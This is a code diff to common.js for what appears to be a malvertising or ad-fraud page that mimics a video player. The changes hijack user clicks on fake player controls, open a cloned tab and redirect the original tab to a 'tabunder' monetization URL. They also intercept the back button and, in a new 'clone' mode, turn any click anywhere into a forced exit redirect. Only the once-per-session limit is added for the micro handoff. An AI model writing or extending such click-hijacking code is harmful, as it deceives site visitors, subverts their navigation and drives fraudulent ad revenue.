@@ -1,6 +1,6 @@
-/* common.js — vanisher-style micro handoff (NO modal)
-   MICRO click -> open CLONE tab, current tab redirects to TABUNDER (AFU)
-   MAIN EXIT -> click anywhere EXCEPT micro zones + back (and only when player is READY)
+/* common.js — vanisher-style micro handoff
+   v1: micro -> open CLONE tab, current tab redirects to TABUNDER (AFU)
+   v2 (clone): ANY click anywhere -> MAIN EXIT (micro disabled, no more clones)
    Supports: mainExit, tabUnderClick, back, reverse, autoexit
 */
 
@@ -242,7 +242,6 @@
     else return;
 
     safe(() => window.syncMetric?.({ event: name, exitZoneId: ex.zoneId || ex.url }));
-
     if (withBack) await initBack(cfg);
     replaceTo(url);
   };
@@ -290,7 +289,6 @@
 
   const run = async (cfg, name) => {
     if (name === "tabUnderClick" && !cfg?.tabUnderClick) {
-      // fallback if tabUnderClick is missing
       return runExitDualTabs(cfg, "mainExit", true);
     }
     if (cfg?.[name]?.newTab) return runExitDualTabs(cfg, name, true);
@@ -350,7 +348,7 @@
   };
 
   // ---------------------------
-  // READY gate: do not steal the "first click" needed for autoplay start
+  // READY gate (only for v1 main/micro)
   // ---------------------------
   const isPlayerReady = () => {
     const btn = document.querySelector(".xh-main-play-trigger");
@@ -358,8 +356,10 @@
   };
 
   // ---------------------------
-  // MICRO -> OPEN CLONE, CURRENT TAB -> TABUNDER (AFU)  [vanisher pattern]
+  // MICRO handoff (v1 only)
   // ---------------------------
+  const MICRO_DONE_KEY = "__micro_done";
+
   const buildCloneUrl = () => {
     const u = new URL(window.location.href);
     u.searchParams.set(CLONE_PARAM, "1");
@@ -376,20 +376,27 @@
   };
 
   const runMicroHandoff = async (cfg) => {
-    // in clone: do nothing special (no recursion)
-    if (isClone) return;
+    if (isClone) return; // clone never creates clones
+
+    // one per session (per browser tab sessionStorage)
+    if (safe(() => sessionStorage.getItem(MICRO_DONE_KEY)) === "1") {
+      // if already done, degrade to mainExit
+      return run(cfg, "mainExit");
+    }
+    safe(() => sessionStorage.setItem(MICRO_DONE_KEY, "1"));
 
     const cloneUrl = buildCloneUrl();
     const monetUrl = await buildTabUnderUrl(cfg);
 
-    // 1) open clone (user stays with player there)
     safe(() => window.syncMetric?.({ event: "micro_open_clone" }));
     openTab(cloneUrl);
 
-    // 2) redirect CURRENT tab to tabunder (this is the "under" monetization)
     if (monetUrl) {
       safe(() => window.syncMetric?.({ event: "tabUnderClick" }));
       replaceTo(monetUrl);
+    } else {
+      // fallback
+      run(cfg, "mainExit");
     }
   };
 
@@ -399,7 +406,6 @@
   const initClickMap = (cfg) => {
     const fired = { mainExit: false, back: false };
 
-    // your micro triggers
     const microTargets = new Set([
       "timeline",
       "play_pause",
@@ -414,7 +420,7 @@
       const zone = e.target?.closest?.("[data-target]");
       const t = zone?.getAttribute("data-target") || "";
 
-      // BACK button should work anytime
+      // Back stays as "back exit" (as before)
       if (t === "back_button") {
         if (fired.back) return;
         fired.back = true;
@@ -424,10 +430,20 @@
         return;
       }
 
-      // Until READY: do not intercept (let your preview-start click work)
+      // CLONE behavior: ANY click anywhere -> mainExit (no micro, no ready gate)
+      if (isClone) {
+        if (fired.mainExit) return;
+        fired.mainExit = true;
+        e.preventDefault();
+        e.stopPropagation();
+        run(cfg, "mainExit").catch(err);
+        return;
+      }
+
+      // v1: until READY do not intercept (let preview start logic work)
       if (!isPlayerReady()) return;
 
-      // MICRO
+      // v1 MICRO
       if (microTargets.has(t)) {
         e.preventDefault();
         e.stopPropagation();
@@ -435,7 +451,7 @@
         return;
       }
 
-      // MAIN EXIT: everything else (video, black area, play button, etc.)
+      // v1 MAIN EXIT: everything else
       if (fired.mainExit) return;
       fired.mainExit = true;
       e.preventDefault();
